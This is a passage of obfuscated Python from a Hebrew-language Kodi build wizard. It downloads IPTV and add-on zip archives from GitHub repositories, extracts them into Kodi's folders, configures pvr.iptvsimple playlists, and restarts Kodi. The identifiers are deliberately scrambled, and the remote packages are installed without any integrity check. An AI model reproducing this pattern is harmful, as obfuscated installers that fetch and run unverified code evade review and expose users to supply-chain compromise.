                    O0O00OOOO00000O00 .update (int (OO0O00OOO0O0O0O0O ),"Downloading "+'iptv',O000OO0O00000OO0O ,OOOO00O0000OO0O0O )#line:6369
              OO0O000000OOO0OO0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6372
              O0OO00000OOOO0OOO .close ()#line:6375
              extract .all (OO00O0000O000O000 ,OO0O000000OOO0OO0 ,O0O00OOOO00000O00 )#line:6376
              wiz .kodi17Fix ()#line:6378
              try :#line:6380
                os .remove (OO00O0000O000O000 )#line:6381
              except :#line:6383
                pass #line:6384
              O0O00OOOO00000O00 .close ()#line:6385
              xbmc .sleep (5000 )#line:6387
              OO0OOO0O0OOOO00O0 ='התקנת לקוח טלוויזיה חיה'#line:6389
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OOO0O0OOOO00O0 ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:6390
              resetkodi ()#line:6391
          xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:6392
      if xbmc .getCondVisibility ('system.platform.android')and KODIV >=18 :#line:6393
          if not os .path .exists (os .path .join (ADDONS ,'pvr.iptvsimple')):#line:6394
              O00OO00000O00O000 ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18android.zip?raw=true'#line:6395
              OO00OO0O0OOOO000O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6396
              OO00OO0O0OOO0O000 =xbmcgui .DialogProgress ()#line:6397
              OO00OO0O0OOO0O000 .create ("XBMC ISRAEL","Downloading "+'iptv','','Please Wait')#line:6398
              OO00O0000O000O000 =os .path .join (OO00OO0O0OOOO000O ,'isr.zip')#line:6399
              O000O0OO0OOOOO0O0 =urllib2 .Request (O00OO00000O00O000 )#line:6400
              OOOO0O00OO000O0OO =urllib2 .urlopen (O000O0OO0OOOOO0O0 )#line:6401
              O0O00OOOO00000O00 =xbmcgui .DialogProgress ()#line:6403
              O0O00OOOO00000O00 .create ("Downloading","Downloading "+'iptv')#line:6404
              O0O00OOOO00000O00 .update (0 )#line:6405
              O0OO00000OOOO0OOO =open (OO00O0000O000O000 ,'wb')#line:6407
              try :#line:6409
                OOOO00OOOO0OO000O =OOOO0O00OO000O0OO .info ().getheader ('Content-Length').strip ()#line:6410
                O0O0OO0O000000O00 =True #line:6411
              except AttributeError :#line:6412
                    O0O0OO0O000000O00 =False #line:6413
              if O0O0OO0O000000O00 :#line:6415
                    OOOO00OOOO0OO000O =int (OOOO00OOOO0OO000O )#line:6416
              O00O0O0000OOOO000 =0 #line:6418
              OOO0O0O00OO000OOO =time .time ()#line:6419
              while True :#line:6420
                    O00000OOOO0OOO000 =OOOO0O00OO000O0OO .read (8192 )#line:6421
                    if not O00000OOOO0OOO000 :#line:6422
                        sys .stdout .write ('\n')#line:6423
                        break #line:6424
                    O00O0O0000OOOO000 +=len (O00000OOOO0OOO000 )#line:6426
                    O0OO00000OOOO0OOO .write (O00000OOOO0OOO000 )#line:6427
                    if not O0O0OO0O000000O00 :#line:6429
                        OOOO00OOOO0OO000O =O00O0O0000OOOO000 #line:6430
                    if O0O00OOOO00000O00 .iscanceled ():#line:6431
                       O0O00OOOO00000O00 .close ()#line:6432
                       try :#line:6433
                        os .remove (OO00O0000O000O000 )#line:6434
                       except :#line:6435
                        pass #line:6436
                       break #line:6437
                    OO0O00OOO0O0O0O0O =float (O00O0O0000OOOO000 )/OOOO00OOOO0OO000O #line:6438
                    OO0O00OOO0O0O0O0O =round (OO0O00OOO0O0O0O0O *100 ,2 )#line:6439
                    O0OO00OO000O0O0OO =O00O0O0000OOOO000 /(1024 *1024 )#line:6440
                    O000OOO0OOOOO00O0 =OOOO00OOOO0OO000O /(1024 *1024 )#line:6441
                    O000OO0O00000OO0O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OO00OO000O0O0OO ,'teal',O000OOO0OOOOO00O0 )#line:6442
                    if (time .time ()-OOO0O0O00OO000OOO )>0 :#line:6443
                      OOO00OO00OO0OOO0O =O00O0O0000OOOO000 /(time .time ()-OOO0O0O00OO000OOO )#line:6444
                      OOO00OO00OO0OOO0O =OOO00OO00OO0OOO0O /1024 #line:6445
                    else :#line:6446
                     OOO00OO00OO0OOO0O =0 #line:6447
                    OOO00O000O0OO00O0 ='KB'#line:6448
                    if OOO00OO00OO0OOO0O >=1024 :#line:6449
                       OOO00OO00OO0OOO0O =OOO00OO00OO0OOO0O /1024 #line:6450
                       OOO00O000O0OO00O0 ='MB'#line:6451
                    if OOO00OO00OO0OOO0O >0 and not OO0O00OOO0O0O0O0O ==100 :#line:6452
                        OOOO0OO0OO00OO00O =(OOOO00OOOO0OO000O -O00O0O0000OOOO000 )/OOO00OO00OO0OOO0O #line:6453
                    else :#line:6454
                        OOOO0OO0OO00OO00O =0 #line:6455
                    OOOO00O0000OO0O0O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOO00OO00OO0OOO0O ,OOO00O000O0OO00O0 )#line:6456
                    O0O00OOOO00000O00 .update (int (OO0O00OOO0O0O0O0O ),"Downloading "+'iptv',O000OO0O00000OO0O ,OOOO00O0000OO0O0O )#line:6458
              OO0O000000OOO0OO0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6461
              O0OO00000OOOO0OOO .close ()#line:6464
              extract .all (OO00O0000O000O000 ,OO0O000000OOO0OO0 ,O0O00OOOO00000O00 )#line:6465
              wiz .kodi17Fix ()#line:6466
              try :#line:6468
                os .remove (OO00O0000O000O000 )#line:6469
              except :#line:6471
                pass #line:6472
              O0O00OOOO00000O00 .close ()#line:6473
              xbmc .sleep (5000 )#line:6475
              OO0OOO0O0OOOO00O0 ='התקנת לקוח טלוויזיה חיה'#line:6477
              wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OOO0O0OOOO00O0 ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:6478
              resetkodi ()#line:6479
          xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:6481
      if xbmc .getCondVisibility ('system.platform.android')and KODIV <=18 and KODIV >=17 :#line:6482
       xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:6483
       xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:6484
def iptvidanplus ():#line:6485
    OOO0OOOOO00OOOOOO =xbmcaddon .Addon ('plugin.video.idanplus')#line:6486
    OOO0OOOOO00OOOOOO .setSetting ('useIPTV','true')#line:6487
    xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.idanplus/?mode=7)")#line:6488
    if KODIV >=17 and KODIV <18 :#line:6491
        OOOO0OO0000OOOOOO ='https://github.com/vip200/victory/blob/master/idanplus17.zip?raw=true'#line:6493
        O00O0OO0OO00O0000 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6494
        O000O000OOO0OO00O =xbmcgui .DialogProgress ()#line:6495
        O000O000OOO0OO00O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:6496
        OO0O00OOOO0O00000 =os .path .join (PACKAGES ,'isr.zip')#line:6497
        O00000O00OOOOOOOO =urllib2 .Request (OOOO0OO0000OOOOOO )#line:6498
        OOOO00O0OO0OO00OO =urllib2 .urlopen (O00000O00OOOOOOOO )#line:6499
        OO00OOOOOOOOOOOO0 =xbmcgui .DialogProgress ()#line:6501
        OO00OOOOOOOOOOOO0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:6502
        OO00OOOOOOOOOOOO0 .update (0 )#line:6503
        OOOOO0OO00000O0OO =open (OO0O00OOOO0O00000 ,'wb')#line:6505
        try :#line:6507
          OOOOOO00OO0OOOO0O =OOOO00O0OO0OO00OO .info ().getheader ('Content-Length').strip ()#line:6508
          OO0OOOOOOOOO0O00O =True #line:6509
        except AttributeError :#line:6510
              OO0OOOOOOOOO0O00O =False #line:6511
        if OO0OOOOOOOOO0O00O :#line:6513
              OOOOOO00OO0OOOO0O =int (OOOOOO00OO0OOOO0O )#line:6514
        OO0OOOOO00O0OO0O0 =0 #line:6516
        O00O0O0OO0O0000O0 =time .time ()#line:6517
        while True :#line:6518
              O0O0OO000OO0000O0 =OOOO00O0OO0OO00OO .read (8192 )#line:6519
              if not O0O0OO000OO0000O0 :#line:6520
                  sys .stdout .write ('\n')#line:6521
                  break #line:6522
              OO0OOOOO00O0OO0O0 +=len (O0O0OO000OO0000O0 )#line:6524
              OOOOO0OO00000O0OO .write (O0O0OO000OO0000O0 )#line:6525
              if not OO0OOOOOOOOO0O00O :#line:6527
                  OOOOOO00OO0OOOO0O =OO0OOOOO00O0OO0O0 #line:6528
              if OO00OOOOOOOOOOOO0 .iscanceled ():#line:6529
                 OO00OOOOOOOOOOOO0 .close ()#line:6530
                 try :#line:6531
                  os .remove (OO0O00OOOO0O00000 )#line:6532
                 except :#line:6533
                  pass #line:6534
                 break #line:6535
              O0OO0OO0OOO00OO00 =float (OO0OOOOO00O0OO0O0 )/OOOOOO00OO0OOOO0O #line:6536
              O0OO0OO0OOO00OO00 =round (O0OO0OO0OOO00OO00 *100 ,2 )#line:6537
              O00OOO0OO0O0OOOOO =OO0OOOOO00O0OO0O0 /(1024 *1024 )#line:6538
              OO0OOO0OOOO0OOO0O =OOOOOO00OO0OOOO0O /(1024 *1024 )#line:6539
              OOOO0O0O0O0OO0OO0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O00OOO0OO0O0OOOOO ,'teal',OO0OOO0OOOO0OOO0O )#line:6540
              if (time .time ()-O00O0O0OO0O0000O0 )>0 :#line:6541
                OO0O0O0O00000OO0O =OO0OOOOO00O0OO0O0 /(time .time ()-O00O0O0OO0O0000O0 )#line:6542
                OO0O0O0O00000OO0O =OO0O0O0O00000OO0O /1024 #line:6543
              else :#line:6544
               OO0O0O0O00000OO0O =0 #line:6545
              O0O00OOO0OO000OOO ='KB'#line:6546
              if OO0O0O0O00000OO0O >=1024 :#line:6547
                 OO0O0O0O00000OO0O =OO0O0O0O00000OO0O /1024 #line:6548
                 O0O00OOO0OO000OOO ='MB'#line:6549
              if OO0O0O0O00000OO0O >0 and not O0OO0OO0OOO00OO00 ==100 :#line:6550
                  OO0O0O00OOO000OO0 =(OOOOOO00OO0OOOO0O -OO0OOOOO00O0OO0O0 )/OO0O0O0O00000OO0O #line:6551
              else :#line:6552
                  OO0O0O00OOO000OO0 =0 #line:6553
              O000O0OO0O0O00000 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO0O0O0O00000OO0O ,O0O00OOO0OO000OOO )#line:6554
              OO00OOOOOOOOOOOO0 .update (int (O0OO0OO0OOO00OO00 ),OOOO0O0O0O0OO0OO0 ,O000O0OO0O0O00000 +"[B][COLOR=silver]מוריד.... [/COLOR][/B]")#line:6556
        O0000000O0O000O0O =xbmc .translatePath (os .path .join ('special://home/'))#line:6559
        OOOOO0OO00000O0OO .close ()#line:6562
        extract .all (OO0O00OOOO0O00000 ,O0000000O0O000O0O ,OO00OOOOOOOOOOOO0 )#line:6563
        try :#line:6567
          os .remove (OO0O00OOOO0O00000 )#line:6568
        except :#line:6569
          pass #line:6570
        wiz .kodi17Fix ()#line:6571
        xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:6572
        time .sleep (10 )#line:6573
        OO0O0OO00OO00O00O =xbmcaddon .Addon ('pvr.iptvsimple')#line:6574
        OO0O0OO00OO00O00O .setSetting ('epgTimeShift','1.000000')#line:6575
        OO0O0OO00OO00O00O .setSetting ('m3uPathType','0')#line:6576
        OO0O0OO00OO00O00O .setSetting ('epgPathType','0')#line:6577
        OO0O0OO00OO00O00O .setSetting ('epgPath','special://profile/addon_data/plugin.video.idanplus/epg.xml')#line:6578
        OO0O0OO00OO00O00O .setSetting ('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus2.m3u')#line:6579
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'הגדרת ערוצי עידן פלוס'),'[COLOR %s]הושלם בהצלחה[/COLOR]'%COLOR2 )#line:6580
        resetkodi ()#line:6581
    if KODIV >=18 :#line:6584
        iptvkodi18idan ()#line:6586
        wiz .kodi17Fix ()#line:6587
        time .sleep (10 )#line:6589
        OO0O0OO00OO00O00O =xbmcaddon .Addon ('pvr.iptvsimple')#line:6590
        OO0O0OO00OO00O00O .setSetting ('epgTimeShift','1.000000')#line:6591
        OO0O0OO00OO00O00O .setSetting ('m3uPathType','0')#line:6592
        OO0O0OO00OO00O00O .setSetting ('epgPathType','0')#line:6593
        OO0O0OO00OO00O00O .setSetting ('epgPath','special://profile/addon_data/plugin.video.idanplus/epg.xml')#line:6594
        OO0O0OO00OO00O00O .setSetting ('m3uPath','special://profile/addon_data/plugin.video.idanplus/idanplus3.m3u')#line:6595
        O00OO0OO0O00O00O0 ='הגדרת ערוצי עידן פלוס'#line:6596
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OO0OO0O00O00O0 ),'[COLOR %s]הקודי יסגר כעת...[/COLOR]'%COLOR2 )#line:6597
        resetkodi ()#line:6598
def iptvsimpldown ():#line:6614
    OOO000000O0OOOO0O =(IPTV18 )#line:6616
    OOOO0O0OOOO0OO00O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6617
    O0OO0O0OOO0OOO00O =xbmcgui .DialogProgress ()#line:6618
    O0OO0O0OOO0OOO00O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:6619
    OO0OO000O0000OO0O =os .path .join (PACKAGES ,'isr.zip')#line:6620
    O0OO0OOOO000OO0O0 =urllib2 .Request (OOO000000O0OOOO0O )#line:6621
    OOO0000OOO0O00OOO =urllib2 .urlopen (O0OO0OOOO000OO0O0 )#line:6622
    OOOO0O0O0O0O0000O =xbmcgui .DialogProgress ()#line:6624
    OOOO0O0O0O0O0000O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:6625
    OOOO0O0O0O0O0000O .update (0 )#line:6626
    O0OO0O00000OOOO0O =open (OO0OO000O0000OO0O ,'wb')#line:6628
    try :#line:6630
      OO000O0O000O00000 =OOO0000OOO0O00OOO .info ().getheader ('Content-Length').strip ()#line:6631
      O0000O00O00O0OOO0 =True #line:6632
    except AttributeError :#line:6633
          O0000O00O00O0OOO0 =False #line:6634
    if O0000O00O00O0OOO0 :#line:6636
          OO000O0O000O00000 =int (OO000O0O000O00000 )#line:6637
    O0O0O0OO00OO0OO00 =0 #line:6639
    OO0OO0O000OO0000O =time .time ()#line:6640
    while True :#line:6641
          OO000OOOOO0000000 =OOO0000OOO0O00OOO .read (8192 )#line:6642
          if not OO000OOOOO0000000 :#line:6643
              sys .stdout .write ('\n')#line:6644
              break #line:6645
          O0O0O0OO00OO0OO00 +=len (OO000OOOOO0000000 )#line:6647
          O0OO0O00000OOOO0O .write (OO000OOOOO0000000 )#line:6648
          if not O0000O00O00O0OOO0 :#line:6650
              OO000O0O000O00000 =O0O0O0OO00OO0OO00 #line:6651
          if OOOO0O0O0O0O0000O .iscanceled ():#line:6652
             OOOO0O0O0O0O0000O .close ()#line:6653
             try :#line:6654
              os .remove (OO0OO000O0000OO0O )#line:6655
             except :#line:6656
              pass #line:6657
             break #line:6658
          O0O000O0OO0OOOO0O =float (O0O0O0OO00OO0OO00 )/OO000O0O000O00000 #line:6659
          O0O000O0OO0OOOO0O =round (O0O000O0OO0OOOO0O *100 ,2 )#line:6660
          O0O0OO0O0OO0OO000 =O0O0O0OO00OO0OO00 /(1024 *1024 )#line:6661
          O00O0OO0O0O000OOO =OO000O0O000O00000 /(1024 *1024 )#line:6662
          O00OO0O0000O00OO0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0O0OO0O0OO0OO000 ,'teal',O00O0OO0O0O000OOO )#line:6663
          if (time .time ()-OO0OO0O000OO0000O )>0 :#line:6664
            OOO00O000O000000O =O0O0O0OO00OO0OO00 /(time .time ()-OO0OO0O000OO0000O )#line:6665
            OOO00O000O000000O =OOO00O000O000000O /1024 #line:6666
          else :#line:6667
           OOO00O000O000000O =0 #line:6668
          OO000O00O0OO00O0O ='KB'#line:6669
          if OOO00O000O000000O >=1024 :#line:6670
             OOO00O000O000000O =OOO00O000O000000O /1024 #line:6671
             OO000O00O0OO00O0O ='MB'#line:6672
          if OOO00O000O000000O >0 and not O0O000O0OO0OOOO0O ==100 :#line:6673
              O000O00O0000O00OO =(OO000O0O000O00000 -O0O0O0OO00OO0OO00 )/OOO00O000O000000O #line:6674
          else :#line:6675
              O000O00O0000O00OO =0 #line:6676
          OOOOO000O0O00O000 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOO00O000O000000O ,OO000O00O0OO00O0O )#line:6677
          OOOO0O0O0O0O0000O .update (int (O0O000O0OO0OOOO0O ),O00OO0O0000O00OO0 ,OOOOO000O0O00O000 +"[B][COLOR=silver]מוריד.... [/COLOR][/B]")#line:6679
    OOO0OOOOOOOO0OO00 =xbmc .translatePath (os .path .join ('special://home/'))#line:6682
    O0OO0O00000OOOO0O .close ()#line:6685
    extract .all (OO0OO000O0000OO0O ,OOO0OOOOOOOO0OO00 ,OOOO0O0O0O0O0000O )#line:6686
    try :#line:6690
      os .remove (OO0OO000O0000OO0O )#line:6691
    except :#line:6692
      pass #line:6693
def telemedia_android5fix ():#line:6694
    O0O00O00OO0OOO0O0 =ADDON .getSetting ('systemtype')#line:6695
    O000O0OO00O00OOOO =ADDON .getSetting ('teleandro')#line:6696
    if xbmc .getCondVisibility ('system.platform.android')and 'Android 5'in O0O00O00OO0OOO0O0 or O000O0OO00O00OOOO =='true':#line:6697
        OO0000OO00O00O0OO ='https://github.com/kodianonymous1/build/blob/master/tele.zip?raw=true'#line:6699
        OO0O0O0000O00O00O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6700
        OO0OOOOO0O00O00O0 =xbmcgui .DialogProgress ()#line:6701
        OO0OOOOO0O00O00O0 .create ("[B][COLOR=yellow]מתאים את ההרחבה טלמדיה למערכת ההפעלה שלך[/COLOR][/B]","[B][COLOR=green]מוריד....[/COLOR][/B]" '','אנא המתן')#line:6702
        OO000OO0O00OO00OO =os .path .join (PACKAGES ,'isr.zip')#line:6703
        OOO00O0000000OOOO =urllib2 .Request (OO0000OO00O00O0OO )#line:6704
        O0OO0OOOOO000O0O0 =urllib2 .urlopen (OOO00O0000000OOOO )#line:6705
        OOO000O0OOOOO0O00 =xbmcgui .DialogProgress ()#line:6707
        OOO000O0OOOOO0O00 .create ("[B][COLOR=yellow]מתאים את ההרחבה טלמדיה למערכת ההפעלה שלך[/COLOR][/B]","[B][COLOR=green]מוריד....[/COLOR][/B]")#line:6708
        OOO000O0OOOOO0O00 .update (0 )#line:6709
        OO0OOOOO0OOOO000O =open (OO000OO0O00OO00OO ,'wb')#line:6711
        try :#line:6713
          O00OO0000OOOOOOOO =O0OO0OOOOO000O0O0 .info ().getheader ('Content-Length').strip ()#line:6714
          O00000OOO0OO0OOO0 =True #line:6715
        except AttributeError :#line:6716
              O00000OOO0OO0OOO0 =False #line:6717
        if O00000OOO0OO0OOO0 :#line:6719
              O00OO0000OOOOOOOO =int (O00OO0000OOOOOOOO )#line:6720
        O0OOOO00O0O00OO00 =0 #line:6722
        OO0OO0OO000OOOOOO =time .time ()#line:6723
        while True :#line:6724
              OO0OOOOOO0OOOOO0O =O0OO0OOOOO000O0O0 .read (8192 )#line:6725
              if not OO0OOOOOO0OOOOO0O :#line:6726
                  sys .stdout .write ('\n')#line:6727
                  break #line:6728
              O0OOOO00O0O00OO00 +=len (OO0OOOOOO0OOOOO0O )#line:6730
              OO0OOOOO0OOOO000O .write (OO0OOOOOO0OOOOO0O )#line:6731
              if not O00000OOO0OO0OOO0 :#line:6733
                  O00OO0000OOOOOOOO =O0OOOO00O0O00OO00 #line:6734
              if OOO000O0OOOOO0O00 .iscanceled ():#line:6735
                 OOO000O0OOOOO0O00 .close ()#line:6736
                 try :#line:6737
                  os .remove (OO000OO0O00OO00OO )#line:6738
                 except :#line:6739
                  pass #line:6740
                 break #line:6741
              O0O00O0OOO0O00O0O =float (O0OOOO00O0O00OO00 )/O00OO0000OOOOOOOO #line:6742
              O0O00O0OOO0O00O0O =round (O0O00O0OOO0O00O0O *100 ,2 )#line:6743
              O0OO0OOOOOOOO00OO =O0OOOO00O0O00OO00 /(1024 *1024 )#line:6744
              O0OOO00OO00OOO000 =O00OO0000OOOOOOOO /(1024 *1024 )#line:6745
              OOOOOOO0O0OO0OOO0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OO0OOOOOOOO00OO ,'teal',O0OOO00OO00OOO000 )#line:6746
              if (time .time ()-OO0OO0OO000OOOOOO )>0 :#line:6747
                OOOO00OOOOOO0OOOO =O0OOOO00O0O00OO00 /(time .time ()-OO0OO0OO000OOOOOO )#line:6748
                OOOO00OOOOOO0OOOO =OOOO00OOOOOO0OOOO /1024 #line:6749
              else :#line:6750
               OOOO00OOOOOO0OOOO =0 #line:6751
              OOOO0O00000O0OO00 ='KB'#line:6752
              if OOOO00OOOOOO0OOOO >=1024 :#line:6753
                 OOOO00OOOOOO0OOOO =OOOO00OOOOOO0OOOO /1024 #line:6754
                 OOOO0O00000O0OO00 ='MB'#line:6755
              if OOOO00OOOOOO0OOOO >0 and not O0O00O0OOO0O00O0O ==100 :#line:6756
                  OOOO00O0OO0O00O00 =(O00OO0000OOOOOOOO -O0OOOO00O0O00OO00 )/OOOO00OOOOOO0OOOO #line:6757
              else :#line:6758
                  OOOO00O0OO0O00O00 =0 #line:6759
              OO0000OO00OO0O00O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOOO00OOOOOO0OOOO ,OOOO0O00000O0OO00 )#line:6760
              OOO000O0OOOOO0O00 .update (int (O0O00O0OOO0O00O0O ),OOOOOOO0O0OO0OOO0 ,OO0000OO00OO0O00O +"[B][COLOR=green]מוריד.... [/COLOR][/B]")#line:6762
        O0OO0OO000OO0000O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6765
        OO0OOOOO0OOOO000O .close ()#line:6768
        extract .all (OO000OO0O00OO00OO ,O0OO0OO000OO0000O ,OOO000O0OOOOO0O00 )#line:6769
        try :#line:6773
          os .remove (OO000OO0O00OO00OO )#line:6774
        except :#line:6775
          pass #line:6776
def testnotify ():#line:6779
	O00OOOOOOOOO00OOO =wiz .workingURL (NOTIFICATION )#line:6780
	if O00OOOOOOOOO00OOO ==True :#line:6781
		try :#line:6782
			OOOOO00OOOOOO000O ,O0OO000OO0O0OO000 =wiz .splitNotify (NOTIFICATION )#line:6783
			if OOOOO00OOOOOO000O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון [/COLOR]"%COLOR2 );return #line:6784
			if wiz .STARTP ()=='ok':#line:6785
				notify .notification (O0OO000OO0O0OO000 ,True )#line:6786
		except Exception as OO0000000OOOO00OO :#line:6787
			wiz .log ("Error on Notifications Window: %s"%str (OO0000000OOOO00OO ),xbmc .LOGERROR )#line:6788
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון[/COLOR]"%COLOR2 )#line:6789
def testnotify2 ():#line:6790
	O00OOO0OOO0O0OO00 =wiz .workingURL (NOTIFICATION2 )#line:6791
	if O00OOO0OOO0O0OO00 ==True :#line:6792
		try :#line:6793
			O0000O0O000OO00OO ,O0OO000OOOO00O0O0 =wiz .splitNotify (NOTIFICATION2 )#line:6794
			if O0000O0O000OO00OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון[/COLOR]"%COLOR2 );return #line:6795
			if wiz .STARTP ()=='ok':#line:6796
				notify .notification2 (O0OO000OOOO00O0O0 ,True )#line:6797
		except Exception as O0OO00000OOO0O000 :#line:6798
			wiz .log ("Error on Notifications Window: %s"%str (O0OO00000OOO0O000 ),xbmc .LOGERROR )#line:6799
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון [/COLOR]"%COLOR2 )#line:6800
def testnotify3 ():#line:6801
	O0OO00O0O00OO0O0O =wiz .workingURL (NOTIFICATION3 )#line:6802
	if O0OO00O0O00OO0O0O ==True :#line:6803
		try :#line:6804
			O00O00OO0O00000OO ,OO0OO0O0OO0O0OO00 =wiz .splitNotify (NOTIFICATION3 )#line:6805
			if O00O00OO0O00000OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6806
			if wiz .STARTP ()=='ok':#line:6807
				notify .notification3 (OO0OO0O0OO0O0OO00 ,True )#line:6808
		except Exception as OO0O0000O0OOO000O :#line:6809
			wiz .log ("Error on Notifications Window: %s"%str (OO0O0000O0OOO000O ),xbmc .LOGERROR )#line:6810
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6811
def wait ():#line:6812
 wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אנא המתן[/COLOR]"%COLOR2 )#line:6813
def infobuild ():#line:6814
	O000OO00O0000OOOO =wiz .workingURL (NOTIFICATION )#line:6815
	if O000OO00O0000OOOO ==True :#line:6816
		try :#line:6817
			OOOOO00O0OO00O000 ,O000O0O00OO0O0OO0 =wiz .splitNotify (NOTIFICATION )#line:6818
			if OOOOO00O0OO00O000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6819
			if wiz .STARTP ()=='ok':#line:6820
				notify .updateinfo (O000O0O00OO0O0OO0 ,True )#line:6821
		except Exception as OOO0OOO00OOOOOOO0 :#line:6822
			wiz .log ("Error on Notifications Window: %s"%str (OOO0OOO00OOOOOOO0 ),xbmc .LOGERROR )#line:6823
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6824
def servicemanual ():#line:6825
	OO0OOO00OOO0OOOO0 =wiz .workingURL (HELPINFO )#line:6826
	if OO0OOO00OOO0OOOO0 ==True :#line:6827
		try :#line:6828
			OOO0O00O0O0000OO0 ,OO0OO0OO000000O00 =wiz .splitNotify (HELPINFO )#line:6829
			if OOO0O00O0O0000OO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:6830
			notify .helpinfo (OO0OO0OO000000O00 ,True )#line:6831
		except Exception as O0O00O0OO000O00O0 :#line:6832
			wiz .log ("Error on Notifications Window: %s"%str (O0O00O0OO000O00O0 ),xbmc .LOGERROR )#line:6833
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:6834
def testupdate ():#line:6836
	if BUILDNAME =="":#line:6837
		notify .updateWindow ()#line:6838
	else :#line:6839
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:6840
def testfirst ():#line:6842
	notify .firstRun ()#line:6843
def testfirstRun ():#line:6845
	notify .firstRunSettings ()#line:6846
def fastinstall ():#line:6849
	notify .firstRuninstall ()#line:6850
def addDir (OO00O0O0O0OOOOO00 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:6857
	OO00000000O0O0O00 =sys .argv [0 ]#line:6858
	if not mode ==None :OO00000000O0O0O00 +="?mode=%s"%urllib .quote_plus (mode )#line:6859
	if not name ==None :OO00000000O0O0O00 +="&name="+urllib .quote_plus (name )#line:6860
	if not url ==None :OO00000000O0O0O00 +="&url="+urllib .quote_plus (url )#line:6861
	O00OOOO00O00000O0 =True #line:6862
	if themeit :OO00O0O0O0OOOOO00 =themeit %OO00O0O0O0OOOOO00 #line:6863
